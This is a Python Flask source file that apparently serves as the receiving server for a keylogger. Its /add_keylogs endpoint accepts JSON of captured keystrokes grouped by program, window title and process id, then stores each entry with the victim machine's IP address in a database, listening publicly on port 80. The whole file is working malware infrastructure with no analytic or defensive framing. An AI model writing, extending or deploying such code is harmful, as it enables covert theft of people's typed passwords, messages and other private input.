from flask import Flask, request, abort
from keylogger_database import (
        create_db,
        init_db,
        insert_keylog,
        get_keylogs)
from constants import DATABASE

app = Flask(__name__)

def parse_json(my_json):
    for exec_name in my_json.keys():
        for window_title in my_json[exec_name].keys():
            pid, keys = my_json[exec_name][window_title].values()
            yield exec_name, window_title, int(pid), keys

@app.route("/add_keylogs", methods=["POST"])
def add_keylogs():
    if(request.json == None):
        return abort(403, description="invalid request has been provided!")
    conn = create_db(DATABASE)
    init_db(conn)
    for exec_name, window_title, pid, keys in parse_json(request.json):
        insert_keylog(conn, request.remote_addr, exec_name, pid, window_title, keys)
    return "OK"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
